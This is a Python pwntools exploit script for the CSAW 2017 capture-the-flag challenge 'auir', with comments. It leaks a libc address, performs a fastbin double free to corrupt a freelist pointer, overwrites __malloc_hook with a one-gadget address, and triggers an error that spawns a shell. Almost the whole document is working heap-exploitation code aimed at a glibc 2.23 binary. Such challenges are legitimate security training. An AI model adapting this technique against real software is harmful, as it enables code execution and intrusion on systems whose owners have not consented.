#!/usr/bin/python

# created for CSAW 2017 Quals pwn 200 challenge "auir"
# uses a fastbin attack to perform a double free and place a corrupted FD pointer to __malloc_hook
# into the fastbin freelist, then sprays a one-shot gadget address into the fake chunk and causes a double
# free error to cause __malloc_hook to be called while satisfying the one gadget's constraints

from pwn import *
import struct

def allocate(p,size,chunk_data):
    p.sendline("1")
    p.recvuntil(">>")
    p.sendline(size)
    p.recvuntil(">>")
    p.sendline(chunk_data)
    p.recvuntil(">>")

def free(p,index):
    p.sendline("2")
    p.recvuntil(">>")
    p.sendline(index)
    #p.recvuntil(">>")

def leak(p,index):
    p.sendline("4")
    p.recvuntil(">>")
    p.sendline(index)
    p.recvline()
    p.recvline()
    data = p.recvline()
    data = data.split("|")
    data = data[0]
    data = data[:8]
    data = struct.unpack("Q",data)
    libc_arena = int(data[0])
    return libc_arena

# preload the appropriate version of libc
p = process("./auir", env = {"LD_PRELOAD": "/home/reverse/heap_exploitation/auir/libc6_2.23-0ubuntu11_amd64.so"})

# break at the stdin entry function
#gdb.attach(p,'''
#break std::istream::operator>>(int&)
#'''
#)

log.info("Beginning info leak stage...")

allocate(p,"144","AAAA")
allocate(p,"144","BBBB")

free(p,"0")
p.recvuntil(">>")
libc_arena = leak(p,"0")
print "Libc_arena leak is at", hex(libc_arena)

# Using the libc2.23 that should match the challenge (others may not have one gadgets that work)
# https://libc.nullbyte.cat/d/libc6_2.23-0ubuntu10_amd64.so
system_addr = libc_arena - 0x37f7e8
base_addr = libc_arena - 0x3c4b78
malloc_hook_addr = base_addr + 0x3c4b10
# other one gadget options; I had issues meeting the constraints for some
#one_gadget = base_addr + 0x45216 # constraint: RAX == NULL
#one_gadget = base_addr + 0x4526a # constraint: rsp + 0x30 == NULL
one_gadget = base_addr + 0xf02a4 # constraint: rsp + 0x50 == NULL
#one_gadget = base_addr + 0xf1147 # constraint: rsp + 0x70 == NULL

print "Address of system is", hex(system_addr)
print "Address of __malloc_hook is", hex(malloc_hook_addr)
print "Address of one_gadget is", hex(one_gadget)

log.success("Leak stage completed!")
log.info("Resetting the heap...")

# now free the other smallbin chunk to set the heap back
# to a clean state in order to begin the fastbin attack
free(p,"1")
p.recvuntil(">>")

log.success("Heap reset!")
log.info("Beginning fastbin attack...")

# begin allocating two fastbins and one smallbin
# smallbin at index 4 to prevent consolidation
allocate(p,"104","A")
allocate(p,"104","B")
allocate(p,"256","C")

# now perform the double free with the intermediary chunk to
# pass the double free security check
# don't forget to reference indices from 2 on, since 0 and 1 haven't been zeroed out
# since the original leak
free(p,"3")
p.recvuntil(">>")
free(p,"2")
p.recvuntil(">>")
free(p,"3")
p.recvuntil(">>")

log.info("Double free performed...")

# now, allocate the chunk at the head of the freelist while
# its duplicate remains in the freelist
# the data entered will change the FD pointer of the dup chunk
overwrite_hook = malloc_hook_addr - 0x23
allocate(p,"104",struct.pack("Q",overwrite_hook))

log.info("FD pointer corrupted...")

# now continue the allocations and prepare to allocate the fake chunk
# that's been placed in the freelist
allocate(p,"104","D")
allocate(p,"104","E")

# allocate the fake chunk, and fill it with the one_gadget address
# Extra bytes are there for alignment purposes
allocate(p,"104",("A" * 3 + struct.pack("Q",one_gadget) * 4))

log.success("Overwrote __malloc_hook with the one gadget!")
log.info("Now triggering a double free error to call __malloc_hook and get a shell...")

# trigger a double free error to call __malloc_hook
print free(p,"3")
print p.recvuntil(">>")
print free(p,"3")
print p.recv()

p.interactive()
p.close()
